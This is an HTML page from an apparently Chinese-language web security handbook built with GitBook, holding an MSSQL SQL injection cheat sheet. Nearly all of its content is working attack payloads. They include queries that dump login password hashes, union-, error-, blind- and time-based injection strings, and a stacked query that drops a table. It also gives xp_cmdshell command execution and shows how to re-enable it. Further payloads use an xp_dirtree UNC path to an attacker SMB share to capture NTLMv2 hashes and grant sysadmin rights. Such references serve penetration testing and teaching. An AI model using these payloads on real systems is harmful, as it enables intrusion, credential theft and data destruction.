@@ -1,0 +1,932 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>MSSQL · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="PostgreSQL.html" />
+    
+    
+    <link rel="prev" href="MYSQL.md" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="MYSQL.md">
+            
+                <span>
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.2.2" data-path="MSSQL.html">
+            
+                <a href="MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.3" data-path="PostgreSQL.html">
+            
+                <a href="PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.4" data-path="SQLite.html">
+            
+                <a href="SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../NOSQL注入/">
+            
+                <a href="../NOSQL注入/">
+            
+                    
+                    NOSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../[XML实体注入漏洞-XXE">
+            
+                <span>
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../模板注入-SSTI/">
+            
+                <a href="../模板注入-SSTI/">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../跨站脚本攻击-XSS/">
+            
+                <a href="../跨站脚本攻击-XSS/">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../不安全的代码管理/">
+            
+                <a href="../不安全的代码管理/">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../内网技巧/内网技巧.html">
+            
+                <a href="../内网技巧/内网技巧.html">
+            
+                    
+                    内网技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >MSSQL</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="mssql-injection">MSSQL Injection</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#mssql-comments">MSSQL comments</a></li>
+<li><a href="#mssql-version">MSSQL version</a></li>
+<li><a href="#mssql-database-name">MSSQL database name</a></li>
+<li><a href="#mssql-list-database">MSSQL List databases</a></li>
+<li><a href="#mssql-list-columns">MSSQL List columns</a></li>
+<li><a href="#mssql-list-tables">MSSQL List tables</a></li>
+<li><a href="#mssql-extract-user-password">MSSQL Extract user/password</a></li>
+<li><a href="#mssql-union-based">MSSQL Union Based</a></li>
+<li><a href="#mssql-error-based">MSSQL Error Based</a></li>
+<li><a href="#mssql-blind-based">MSSQL Blind Based</a></li>
+<li><a href="#mssql-time-based">MSSQL Time Based</a></li>
+<li><a href="#mssql-stack-query">MSSQL Stacked query</a></li>
+<li><a href="#mssql-command-execution">MSSQL Command execution</a></li>
+<li><a href="#mssql-unc-path">MSSQL UNC path</a></li>
+<li><a href="#mssql-make-user-dba">MSSQL Make user DBA</a></li>
+</ul>
+<h2 id="mssql-comments">MSSQL comments</h2>
+<pre><code class="lang-sql"><span class="hljs-comment">-- comment goes here</span>
+<span class="hljs-comment">/* comment goes here */</span>
+</code></pre>
+<h2 id="mssql-version">MSSQL version</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> @@<span class="hljs-keyword">version</span>
+</code></pre>
+<h2 id="mssql-database-name">MSSQL database name</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> DB_NAME()
+</code></pre>
+<h2 id="mssql-list-databases">MSSQL List databases</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysdatabases;
+<span class="hljs-keyword">SELECT</span> DB_NAME(N); &#x2014; for N = 0, 1, 2, &#x2026;
+</code></pre>
+<h2 id="mssql-list-columns">MSSQL List columns</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> syscolumns <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span> = &#x2018;mytable&#x2019;); &#x2014; for the current DB only
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">master</span>..syscolumns.<span class="hljs-keyword">name</span>, TYPE_NAME(<span class="hljs-keyword">master</span>..syscolumns.xtype) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns, <span class="hljs-keyword">master</span>..sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">master</span>..syscolumns.<span class="hljs-keyword">id</span>=<span class="hljs-keyword">master</span>..sysobjects.<span class="hljs-keyword">id</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">master</span>..sysobjects.<span class="hljs-keyword">name</span>=&#x2019;sometable&#x2019;; &#x2014; list colum names and types for master..sometable
+
+<span class="hljs-keyword">SELECT</span> table_catalog, column_name <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span>
+</code></pre>
+<h2 id="mssql-list-tables">MSSQL List tables</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysobjects <span class="hljs-keyword">WHERE</span> xtype = &#x2018;U&#x2019;; &#x2014; <span class="hljs-keyword">use</span> xtype = &#x2018;V&#x2019; <span class="hljs-keyword">for</span> views
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> someotherdb..sysobjects <span class="hljs-keyword">WHERE</span> xtype = &#x2018;U&#x2019;;
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">master</span>..syscolumns.<span class="hljs-keyword">name</span>, TYPE_NAME(<span class="hljs-keyword">master</span>..syscolumns.xtype) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..syscolumns, <span class="hljs-keyword">master</span>..sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">master</span>..syscolumns.<span class="hljs-keyword">id</span>=<span class="hljs-keyword">master</span>..sysobjects.<span class="hljs-keyword">id</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">master</span>..sysobjects.<span class="hljs-keyword">name</span>=&#x2019;sometable&#x2019;; &#x2014; list colum names and types for master..sometable
+
+<span class="hljs-keyword">SELECT</span> table_catalog, table_name <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span>
+</code></pre>
+<h2 id="mssql-extract-userpassword">MSSQL Extract user/password</h2>
+<pre><code class="lang-sql">MSSQL 2000:
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysxlogins
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, <span class="hljs-keyword">master</span>.dbo.fn_varbintohexstr(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysxlogins (Need <span class="hljs-keyword">to</span> <span class="hljs-keyword">convert</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">hex</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">return</span> hashes <span class="hljs-keyword">in</span> MSSQL <span class="hljs-keyword">error</span> message / <span class="hljs-keyword">some</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">query</span> analyzer.)
+
+MSSQL <span class="hljs-number">2005</span>
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, password_hash <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>.<span class="hljs-keyword">sys</span>.sql_logins
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> + &#x2018;-&#x2019; + <span class="hljs-keyword">master</span>.<span class="hljs-keyword">sys</span>.fn_varbintohexstr(password_hash) <span class="hljs-keyword">from</span> <span class="hljs-keyword">master</span>.<span class="hljs-keyword">sys</span>.sql_logins
+</code></pre>
+<h2 id="mssql-union-based">MSSQL Union Based</h2>
+<pre><code class="lang-sql"><span class="hljs-comment">-- extract databases names</span>
+$ <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">master</span>..sysdatabases
+[*] Injection
+[*] msdb
+[*] tempdb
+
+<span class="hljs-comment">-- extract tables from Injection database</span>
+$ <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> Injection..sysobjects <span class="hljs-keyword">WHERE</span> xtype = <span class="hljs-string">&apos;U&apos;</span>
+[*] <span class="hljs-keyword">Profiles</span>
+[*] <span class="hljs-keyword">Roles</span>
+[*] <span class="hljs-keyword">Users</span>
+
+<span class="hljs-comment">-- extract columns for the table Users</span>
+$ <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> syscolumns <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span> = <span class="hljs-string">&apos;Users&apos;</span>)
+[*] UserId
+[*] UserName
+
+<span class="hljs-comment">-- Finally extract the data</span>
+$ <span class="hljs-keyword">SELECT</span>  UserId, UserName <span class="hljs-keyword">from</span> <span class="hljs-keyword">Users</span>
+</code></pre>
+<h2 id="mssql-error-based">MSSQL Error based</h2>
+<pre><code class="lang-sql">For integer inputs : convert(int,@@version)
+For integer inputs : cast((<span class="hljs-keyword">SELECT</span> @@<span class="hljs-keyword">version</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">int</span>)
+
+<span class="hljs-keyword">For</span> <span class="hljs-keyword">string</span> inputs   : <span class="hljs-string">&apos; + convert(int,@@version) + &apos;</span>
+<span class="hljs-keyword">For</span> <span class="hljs-keyword">string</span> inputs   : <span class="hljs-string">&apos; + cast((SELECT @@version) as int) + &apos;</span>
+</code></pre>
+<h2 id="mssql-blind-based">MSSQL Blind based</h2>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> @@<span class="hljs-keyword">version</span> <span class="hljs-keyword">WHERE</span> @@<span class="hljs-keyword">version</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&apos;%12.0.2000.8%&apos;</span>
+
+<span class="hljs-keyword">WITH</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">AS</span> (<span class="hljs-keyword">SELECT</span> (ROW_NUMBER() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> message)) <span class="hljs-keyword">as</span> <span class="hljs-keyword">row</span>,* <span class="hljs-keyword">FROM</span> log_table)
+<span class="hljs-keyword">SELECT</span> message <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">row</span> = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> message <span class="hljs-keyword">like</span> <span class="hljs-string">&apos;t%&apos;</span>
+</code></pre>
+<h2 id="mssql-time-based">MSSQL Time based</h2>
+<pre><code class="lang-sql">ProductID=1;waitfor delay &apos;0:0:10&apos;<span class="hljs-comment">--</span>
+ProductID=1);waitfor delay &apos;0:0:10&apos;<span class="hljs-comment">--</span>
+ProductID=1&apos;;waitfor delay &apos;0:0:10&apos;<span class="hljs-comment">--</span>
+ProductID=1&apos;);waitfor delay &apos;0:0:10&apos;<span class="hljs-comment">--</span>
+ProductID=1));waitfor delay &apos;0:0:10&apos;<span class="hljs-comment">--</span>
+
+IF([INFERENCE]) WAITFOR DELAY &apos;0:0:[SLEEPTIME]&apos;                              comment:   <span class="hljs-comment">--</span>
+</code></pre>
+<h2 id="mssql-stacked-query">MSSQL Stacked Query</h2>
+<p>Use a semi-colon &quot;;&quot; to add another query</p>
+<pre><code class="lang-sql">ProductID=1; <span class="hljs-keyword">DROP</span> members<span class="hljs-comment">--</span>
+</code></pre>
+<h2 id="mssql-command-execution">MSSQL Command execution</h2>
+<pre><code class="lang-sql">EXEC xp_cmdshell &quot;net user&quot;;
+EXEC master.dbo.xp_cmdshell &apos;cmd.exe dir c:&apos;;
+EXEC master.dbo.xp_cmdshell &apos;ping 127.0.0.1&apos;;
+</code></pre>
+<p>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)</p>
+<pre><code class="lang-sql">EXEC sp_configure &apos;<span class="hljs-keyword">show</span> <span class="hljs-keyword">advanced</span> options<span class="hljs-string">&apos;,1;
+RECONFIGURE;
+EXEC sp_configure &apos;</span>xp_cmdshell<span class="hljs-string">&apos;,1;
+RECONFIGURE;
+</span></code></pre>
+<p>To interact with the MSSQL instance.</p>
+<pre><code class="lang-powershell">sqsh -S <span class="hljs-number">192.168</span>.<span class="hljs-number">1</span>.X -U sa -P superPassword
+python mssqlclient.py WORKGROUP/Administrator:password@<span class="hljs-number">192.168</span>.<span class="hljs-number">1</span>X -port <span class="hljs-number">46758</span>
+</code></pre>
+<h2 id="mssql-unc-path">MSSQL UNC Path</h2>
+<p>MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the <code>xp_dirtree</code> function to list the files in our SMB share and grab the NTLMv2 hash.</p>
+<pre><code class="lang-sql">1&apos;; <span class="hljs-keyword">use</span> <span class="hljs-keyword">master</span>; exec xp_dirtree &apos;\\10.10.15.XX\SHARE&apos;;<span class="hljs-comment">--</span>
+</code></pre>
+<h2 id="mssql-make-user-dba-db-admin">MSSQL Make user DBA (DB admin)</h2>
+<pre><code class="lang-sql">EXEC master.dbo.sp_addsrvrolemember &apos;user&apos;, &apos;sysadmin;
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank">Pentest Monkey - mssql-sql-injection-cheat-sheet</a></li>
+<li><a href="http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/" target="_blank">Sqlinjectionwiki - MSSQL</a></li>
+<li><a href="https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20&#x201C;Order%20By&#x201D;%20clause%20(MSSQL" target="_blank">Error Based - SQL Injection </a>.pdf)</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="MYSQL.md" class="navigation navigation-prev " aria-label="Previous page: MYSQL">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="PostgreSQL.html" class="navigation navigation-next " aria-label="Next page: PostgreSQL">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"MSSQL","level":"2.1.2.2","depth":3,"next":{"title":"PostgreSQL","level":"2.1.2.3","depth":3,"path":"SQL注入/PostgreSQL.md","ref":"SQL注入/PostgreSQL.md","articles":[]},"previous":{"title":"MYSQL","level":"2.1.2.1","depth":3,"path":"SQL注入/MYSQL.md","ref":"SQL注入/MYSQL.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"SQL注入/MSSQL.md","mtime":"2019-09-16T06:55:58.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-09-16T07:03:19.203Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
